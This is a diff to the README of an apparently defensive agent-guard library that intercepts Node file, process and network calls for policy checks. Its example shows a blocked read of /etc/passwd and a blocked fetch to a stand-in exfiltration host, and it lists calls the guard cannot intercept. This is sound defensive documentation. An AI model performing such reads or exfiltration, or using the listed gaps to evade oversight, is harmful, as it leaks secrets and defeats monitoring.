@@ -95,6 +95,77 @@ Both throw `BlockedError`, which carries the whole `Decision` — so a caller th
 already catches it can read `policy_id` and `attributed_to` without a second
 channel.
 
+## Guarding native effects
+
+An agent's blast radius is not only its tool calls — it is `fs`, `child_process`,
+and outbound `fetch`. `installInterceptors` patches those for the process and
+decides each one **before the effect**:
+
+```ts
+import { RemoteEngine, installInterceptors } from "interlock-guard";
+
+const engine = new RemoteEngine("/tmp/il-guard.sock", { timeout: 5 });
+const interceptors = installInterceptors({ engine });
+
+interceptors.covered;    // "fs.readFile", "fs.rm", …, "child_process.exec", "http.fetch"
+interceptors.uncovered;  // the holes below - named, not assumed away
+
+await fs.promises.readFile("/etc/passwd");  // BlockedError; the file is never read
+await fetch("http://evil.example/exfil");   // BlockedError; nothing leaves the process
+
+interceptors.uninstall();  // restores every patched function
+```
+
+The action names are namespaced — `fs.readFile`, `child_process.exec`,
+`http.fetch` — so a rule reads `event.action == "fs.rm"` and
+`event.args["path"]`, and a raw egress call is distinguishable from an MCP tool
+that happens to be named `fetch`. A MODIFY rewrites the argument (`path`,
+`command`, `url`) and the rewritten value is what the effect uses.
+
+For a model SDK (Anthropic, OpenAI, or a home-grown loop), guard the seam the
+application already has — the runner or the tool map:
+
+```ts
+import { guardToolMap, guardToolRunner } from "interlock-guard";
+
+const tools = guardToolMap({ read_file, shell, search }, { engine });
+// or, for a (name, args) => result dispatcher:
+const run = guardToolRunner(myDispatcher, { engine });
+```
+
+Nothing imports a model SDK; both shapes funnel through the same
+`enforceToolCall` / `enforceToolResult` core, so one rule enforces identically
+whether the agent speaks MCP, a model SDK, or a raw loop.
+
+## What is not guarded
+
+Some of Node's surface cannot be reached by any pure-JS patch. These are
+permanent, so they are **named** — `installInterceptors().uncovered` returns them
+— rather than left for a deployer to assume are covered.
+
+- **ESM named imports.** `import { readFile } from "node:fs"` and
+  `import * as fs from "node:fs"` bind to the original function at *link time*;
+  no patch can redirect them. Only `require("node:fs")` (CJS) and
+  `import fs from "node:fs"` (a **default** import, which is the same CJS object)
+  see the interceptor. Guarding an agent means running it with a default import
+  (or CJS) for these modules — there is no way around this from inside the
+  process.
+- **Synchronous and handle-returning calls.** A guard must *await* the verdict
+  before the effect, so anything that must return a value *now* is out of reach:
+  every `*Sync` (`readFileSync`, `rmSync`, …), the openers that return a live
+  handle (`fs.open`, `fs.opendir`, `fs.createReadStream`, `fs.createWriteStream`,
+  `child_process.spawn`, `child_process.fork`), the other `*Sync` process calls,
+  and `http.request` / `https.request` (they return a `ClientRequest`
+  synchronously). `child_process.exec` and `execFile` *are* guarded because their
+  return value is conventionally ignored — the result arrives through the
+  callback.
+- **Result-phase rules on native effects.** The native interceptors decide the
+  **call**, not the return value. An `fs` call can hand back a `Stats`, a
+  `Dirent`, or a stream — objects with no wire form — so inspecting the result
+  would turn an ordinary `fs.stat` into a fail-closed block. Result-phase
+  redaction lives on the MCP and model-SDK paths (`enforceToolResult`), where the
+  value is a tool payload.
+
 ## Subpath exports
 
 | Import | What |
@@ -118,7 +189,8 @@ channel.
   it: on the development machine, a guarded call measured ~47 µs/call against a
   ~0.4 µs no-guard baseline (and ~26 µs on an earlier, less loaded run — the
   number is a smoke figure, not a stated methodology; R12 owns the methodology
-  and the regression gate).
+  and the regression gate). Each native `fs` / `exec` / `fetch` the interceptors
+  guard adds one such round trip.
 - **Some JS values are refused, not coerced.** `undefined`, `NaN`/`±Infinity`, a
   `bigint`, a `Map`/`Date`/class instance, and a `Symbol`-keyed object raise
   `Unrepresentable`. These are the values `JSON.stringify` would silently *drop*
@@ -150,7 +222,11 @@ frozen corpus the Python suite replays. It is the interface between the two
 languages: 13 cases and 9 protocol negatives, each asserting that this client's
 view of a decision matches the engine's. `test/mcp_sdk.test.ts` goes the other
 way and wraps a real `@modelcontextprotocol/sdk` `Client` over an in-memory
-transport.
+transport. `test/fs.test.ts`, `test/exec.test.ts`, and `test/http.test.ts` drive
+the native interceptors against a real daemon (and, for HTTP, a real server that
+proves a blocked request never leaves the process); `test/install.test.ts` pins
+the coverage report and a complete `uninstall`; `test/model.test.ts` covers the
+model-SDK seam.
 
 ## License
 
